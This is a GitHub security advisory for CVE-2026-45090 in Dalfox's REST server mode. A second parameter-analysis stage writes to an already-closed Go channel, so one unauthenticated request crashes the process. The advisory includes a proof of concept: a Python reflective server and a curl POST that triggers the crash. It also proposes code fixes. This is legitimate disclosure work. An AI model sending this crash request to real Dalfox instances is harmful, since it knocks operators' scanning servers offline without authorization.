# [H] Dalfox has an Unauthenticated Remote DoS via Closed-Channel Write in `ParameterAnalysis` (server mode)

## Summary
Severity: High
Advisory: GHSA-2g4x-fq3j-cgq4
CVE: CVE-2026-45090
CWE: CWE-362, CWE-404
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-2g4x-fq3j-cgq4
Type: github-advisory

## Affected
- Go: `github.com/hahwul/dalfox/v2` — affected >=0 <2.13.0
- Go: `github.com/hahwul/dalfox` — affected >=0

## Details
## Summary

`ParameterAnalysis` in `pkg/scanning/parameterAnalysis.go` runs two sequential worker stages that both write to the same `results` channel. The channel is correctly closed after the first stage completes (`close(results)` at line 438), but the second stage — which processes POST-body parameters (`dp`) — is then launched with the same already-closed channel as its output. When a scanned parameter is reflected, `processParams` executes `results <- paramResult` on the closed channel, triggering a Go runtime panic that crashes the entire dalfox process. In server mode, the crash is remotely triggerable by any unauthenticated caller who can reach the REST API, because the default configuration has no API key and the second stage activates whenever `options.Data != ""` (i.e., the attacker supplies the `data` field) and the target reflects at least one parameter.

## Severity

**High** (CVSS 3.1: 7.5)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

- **Attack Vector:** Network — server binds to `0.0.0.0:6664` by default; reachable by any network peer.
- **Attack Complexity:** Low — the attacker controls both trigger conditions: the `data` field that populates the second stage's work queue, and the target URL they point at a reflective server they control.
- **Privileges Required:** None — `--api-key` defaults to `""`, so no auth middleware is registered.
- **User Interaction:** None.
- **Scope:** Unchanged — a goroutine panic without a `recover` terminates the entire Go process; the impact stays within the dalfox process authority.
- **Confidentiality Impact:** None.
- **Integrity Impact:** None.
- **Availability Impact:** High — the entire dalfox server process crashes, requiring manual restart. A single well-timed request is sufficient.

**Note on PR #917**: Commit `8a424d1` (`fix: resolve data race and nil pointer panic in processParams`) fixed two concurrent-safety bugs in `processParams` — a data race on `paramResult.Chars` and a nil pointer dereference on `resp.Header`. It did **not** fix the closed-channel panic reported here, which is a structural ordering bug in `ParameterAnalysis` itself, not inside `processParams`.

## Affected Component

- `pkg/scanning/parameterAnalysis.go` — `ParameterAnalysis()` (lines 436–448): `results` channel closed at line 438, then passed to second-stage `processParams` workers at line 445
- `pkg/scanning/parameterAnalysis.go` — `processParams()` (line 299): `results <- paramResult` panics when `results` is closed

## CWE

- **CWE-362**: Concurrent Execution Using Shared Resource with Improper Synchronization ('Race Condition') — channel lifecycle ordering error
- **CWE-404**: Improper Resource Shutdown or Release

## Description

### Two-Stage Channel Lifecycle Ordering Error

`ParameterAnalysis` allocates a single `results` channel shared by both worker stages:

```go
// pkg/scanning/parameterAnalysis.go:397-408
paramsQue := make(chan string, concurrency)
results := make(chan model.ParamResult, concurrency)   // ← single channel for both stages

go func() {
    for result := range results {   // consumer exits when results is closed
        mutex.Lock()
        params[result.Name] = result
        mutex.Unlock()
    }
}()
```

**First stage** (URL parameters in `p`):

```go
// lines 410-437
for i := 0; i < concurrency; i++ {
    wgg.Add(1)
    go func() {
        processParams(target, paramsQue, results, options, rl, miningCheckerLine, pLog)
        wgg.Done()
    }()
}
// ... feed paramsQue ...
close(paramsQue)
wgg.Wait()
close(results)   // ← line 438: results is now closed; consumer goroutine exits
```

**Second stage** (POST-body parameters in `dp`):

```go
// lines 440-448
var wggg sync.WaitGroup
paramsDataQue := make(chan string, concurrency)
for j := 0; j < concurrency; j++ {
    wggg.Add(1)
    go func() {
        processParams(target, paramsDataQue, results, options, rl, miningCheckerLine, pLog)
        //                                   ^^^^^^^ — same closed channel
        wggg.Done()
    }()
}
```

When a second-stage worker finds a reflected parameter, `processParams` sends to the closed channel:

```go
// pkg/scanning/parameterAnalysis.go:299
results <- paramResult   // panic: send on closed channel
```

A Go runtime panic in a goroutine without a `recover` terminates the entire program. In server mode, this kills the dalfox API server process.

### Trigger Conditions Are Both Attacker-Controlled

**Condition 1 — `dp` is non-empty**: `dp` (the POST-body parameter map) is populated in `addParamsFromWordlist` → `setP` whenever `options.Data != ""`:

```go
// parameterAnalysis.go:41-45
if options.Data != "" {
    if dp.Get(name) == "" {
        dp.Set(name, "")
    }
}
```

The attacker sets `"data": "q=test"` in the JSON body, which propagates through `Initialize` (`lib/func.go:106`). With `"mining-dict": true`, the entire GF-XSS wordlist (hundreds of parameters) flows into `dp`, ensuring the second stage has ample work.

**Condition 2 — a parameter is reflected**: `processParams` sends to `results` only when `vrs` (verified reflection) is true (line 252 → line 299). The attacker controls the target URL — they point it at a server they operate that reflects any query parameter, guaranteeing `vrs = true` on the first matching entry from the wordlist.

### PR #917 Fixed Different Bugs

Commit `8a424d1` addressed:
1. Data race: concurrent `append(paramResult.Chars, char)` with no mutex → added `charsMu sync.Mutex`
2. Nil pointer: `resp.Header` accessed when `resp == nil` → added `&& resp != nil` guard

Neither change touches the channel lifecycle in `ParameterAnalysis`. The closed-channel panic is independent and remains unpatched.

## Proof of Concept

```bash
# Step 1 — Attacker-controlled reflective server
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
class H(BaseHTTPRequestHandler):
    def _h(self):
        qs = parse_qs(urlparse(self.path).query)
        n = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(n).decode() if n else ''
        bq = parse_qs(body)
        v = qs.get('q', [''])[0] or bq.get('q', [''])[0]
        out = f'<html><body>{v}</body></html>'.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(out)))
        self.end_headers()
        self.wfile.write(out)
    def do_GET(self): self._h()
    def do_POST(self): self._h()
    def log_message(self, *a): pass
HTTPServer(('127.0.0.1', 18083), H).serve_forever()
PY

# Step 2 — Start dalfox REST server (default: no API key)
go run . server --host 127.0.0.1 --port 16664 --type rest

# Step 3 — Single unauthenticated request terminates the server process
curl -s -X POST http://127.0.0.1:16664/scan \
  -H 'Content-Type: application/json' \
  --data '{
    "url": "http://127.0.0.1:18083/?q=test",
    "options": {
      "data": "q=test",
      "mining-dict": true,
      "use-headless": false,
      "worker": 1
    }
  }'

# Expected: dalfox process exits immediately with:
# goroutine N [running]:
# panic: send on closed channel
#   pkg/scanning/parameterAnalysis.go:299 +0x...

# Step 4 — Verify server is down
curl -s http://127.0.0.1:16664/health
# Expected: connection refused
```

No `X-API-KEY` header is required. The reflective server is attacker-controlled and guarantees the `vrs = true` condition that triggers the channel write.

## Impact

- **Complete server process crash** on a single unauthenticated POST request — no login, no API key, no special permissions required.
- All in-flight scans are lost without results.
- The server requires a manual restart; under automated process managers (systemd, Docker `--restart=always`) repeated triggering can create a denial-of-service loop.
- The attack requires only network access to port 6664 and a reflective HTTP server reachable by the dalfox instance — both attacker-controlled conditions.

## Recommended Remediation

### Option 1: Allocate a fresh `results` channel for the second stage (preferred)

The simplest and most direct fix: give each stage its own channel and consumer. The second stage should not reuse a channel that was created and closed for the first stage.

```go
// pkg/scanning/parameterAnalysis.go — replace the second stage block:

var wggg sync.WaitGroup
paramsDataQue := make(chan string, concurrency)
results2 := make(chan model.ParamResult, concurrency)   // fresh channel

go func() {
    for result := range results2 {
        mutex.Lock()
        params[result.Name] = result
        mutex.Unlock()
    }
}()

for j := 0; j < concurrency; j++ {
    wggg.Add(1)
    go func() {
        processParams(target, paramsDataQue, results2, options, rl, miningCheckerLine, pLog)
        wggg.Done()
    }()
}

// ... feed paramsDataQue ...
close(paramsDataQue)
wggg.Wait()
close(results2)   // close after all writers are done
```

### Option 2: Merge both parameter maps before the single worker stage

Process `p` and `dp` entries through a single shared `paramsQue` and `results`, eliminating the two-stage design:

```go
// Before the worker loop, merge dp into p (or into a unified queue):
for k := range dp {
    // feed to the same paramsQue along with p entries
}
// Then run a single close(paramsQue) → wgg.Wait() → close(results)
```

This is a more invasive refactor but removes the structural root cause. The current two-stage design is the fundamental source of the ordering bug.

### Option 3: Add a `recover` in processParams goroutines (stopgap only)

Catching the panic prevents the process from crashing but does not fix the lost results or the channel invariant violation. Recommended only as a temporary defensive measure while the channel lifecycle is corrected:

```go
go func() {
    defer func() {
        if r := recover(); r != nil {
            printing.DalLog("ERROR", fmt.Sprintf("processParams panic recovered: %v", r), options)
        }
        wggg.Done()
    }()
    processParams(target, paramsDataQue, results, options, rl, miningCheckerLine, pLog)
}()
```

Option 1 is the recommended primary fix. Option 3 should be combined with Option 1, not used as a substitute.

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/hahwul/dalfox/security/advisories/GHSA-2g4x-fq3j-cgq4
- https://nvd.nist.gov/vuln/detail/CVE-2026-45090
- https://github.com/hahwul/dalfox
- https://github.com/hahwul/dalfox/releases/tag/v2.13.0
